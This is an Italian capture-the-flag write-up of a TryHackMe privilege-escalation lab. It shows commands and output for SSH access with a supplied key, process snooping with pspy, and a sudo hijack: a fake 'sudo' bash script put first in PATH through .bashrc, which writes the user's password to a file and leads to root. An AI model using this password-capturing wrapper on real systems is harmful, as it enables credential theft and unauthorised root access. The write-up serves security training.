
#laboratorio #tryhackmelabs 

https://tryhackme.com/room/eavesdropper

Ascolta attentamente, potresti sentire una password!

Salve di nuovo, hacker. Dopo aver scoperto la chiave privata SSH di un utente, Frank , sei entrato in un ambiente di destinazione.

**Scaricare la chiave privata SSH allegata.**

**Nota:** se si utilizza AttackBox, è possibile copiare e incollare la chiave privata SSH utilizzando l'icona "Appunti" situata nel vassoio scorrevole, come mostrato nella GIF qui sotto:

```
nano id_rsa
```

```
Copiarci la chiave
```

```
chmod 600 id_rsa
```
Hai accesso a `frank`, ma vuoi essere `root`! Come puoi aumentare i privilegi? Se ascolti attentamente, forse puoi scoprire qualcosa che potrebbe aiutarti!


```
nmap -O -v -Pn 10.10.119.132
```
```
PORT   STATE SERVICE
22/tcp open  ssh
```
Ci connettiamo con ssh
```
ssh -i id_rsa frank@10.10.119.132
```

```
ls -al
```
```
frank@workstation:~$ ls -al
total 36
drwxr-xr-x 1 frank frank 4096 Mar 14  2022 .
drwxr-xr-x 1 root  root  4096 Mar 14  2022 ..
lrwxrwxrwx 1 frank frank    9 Mar 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 frank frank 3771 Feb 25  2020 .bashrc
drwx------ 2 frank frank 4096 Mar 14  2022 .cache
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
drwxr-xr-x 1 frank frank 4096 May 16 13:10 .ssh
-rw-r--r-- 1 frank frank    0 Mar 14  2022 .sudo_as_admin_successful

```

```
id
```
```
uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)
```
Frank fa parte del gruppo sudo. Ma non conosciamo la sua password

Vediamo i processi in esecuzione
```
frank@workstation:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.7  12172  7208 ?        Ss   12:02   0:00 sshd: /usr/sbin/sshd -D [listener] 0 
root        4510  0.0  0.9  13580  8832 ?        Ss   12:44   0:00 sshd: frank [priv]
frank       4521  0.0  0.5  13904  5336 ?        R    12:44   0:00 sshd: frank@pts/0
frank       4522  0.0  0.4   5992  3916 pts/0    Ss   12:44   0:00 -bash
frank       7322  0.0  0.5   9268  5852 pts/0    S+   13:10   0:00 ssh -i id_rsa frank@workstation
root        7323  0.0  0.8  13580  8668 ?        Ss   13:10   0:00 sshd: frank [priv]
frank       7334  0.0  0.5  13908  5280 ?        R    13:10   0:00 sshd: frank@pts/1
frank       7335  0.0  0.3   5992  3856 pts/1    Ss   13:10   0:00 -bash
frank      10814  0.0  0.3   7644  3164 pts/1    R+   13:42   0:00 ps aux

```

Utilizziamo lo [script pspy](https://github.com/DominicBreuker/pspy) per elencare i processi in esecuzione. Lo script ci permette di visualizzare i processi in esecuzione di tutti gli utenti senza privilegi sudo. Scarica lo script sul tuo computer.

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

avvia un server web Python sulla tua macchina Kali con il seguente comando.

```
python3 -m http.server 8080
```

Ora, scarica lo script dal computer di destinazione.

```
wget http://10.10.31.120:8080/pspy64
```

```
chmod +x pspy64
```

```
./pspy64
```

```
2025/05/16 14:09:52 CMD: UID=1000  PID=13752  | /bin/sh /etc/init.d/ssh status 
2025/05/16 14:09:52 CMD: UID=1000  PID=13753  | /bin/sh /etc/init.d/ssh status 
2025/05/16 14:09:52 CMD: UID=1000  PID=13755  | /bin/sh /usr/sbin/service --status-all 
2025/05/16 14:09:52 CMD: UID=???   PID=13754  | ???
2025/05/16 14:09:53 CMD: UID=1000  PID=13756  | 
2025/05/16 14:09:54 CMD: UID=1000  PID=13757  | 
2025/05/16 14:09:54 CMD: UID=0     PID=13758  | sudo cat /etc/shadow 

```

una volta che Frank accede tramite SSH, un comando **(sudo cat /etc/passwd)** viene eseguito da root con privilegi sudo

**Sudo Hijacking**
Creeremo un file sudo dannoso che registra la password e la salveremo in un file e aggiungeremo il percorso del file a $PATH. 
Controlliamo l'attuale $PATH.

```
echo $PATH
```
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```
pwd
```
```
frank@workstation:~$ pwd
/home/frank
```

 file sudo falso che salva la password in un file  pass.txt
```
nano sudo
```
```
#!/bin/bash
# Ask the user for login details
read -sp 'Enter frank Password: ' passvar
echo $passvar > /home/frank/pass.txt
```
è uno script Bash che chiede all'utente di inserire una password e poi tenta di scrivere questa password in un file

diamo permessi di esecuzione
```
chmod +x sudo
```

Apriamo .bashrc ed aggiungiamo in alto la seguente riga

```
nano .bashrc
```
```
PATH=/home/frank:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

connettiamoci da un nuovo terminale in ssh per ottenere il file con la password
```
ssh -i id_rsa frank@10.10.119.132
```
```
cat pass.txt
```
```
frank@workstation:~$ ls
pass.txt  pspy64  pspy64.1  sudo
frank@workstation:~$ cat pass.txt
!@#frankisawesome2022%*
```
password ottenuta
```
!@#frankisawesome2022%*
```
Passiamo a root con la password ottenuta
```
sudo su
```

```
whoami
```
```
root
```

```
cd /root
```

```
ls
```

```
cat flag.txt
```

```
flag{xxxxxxxxxxxxxxxxxxxx}
```

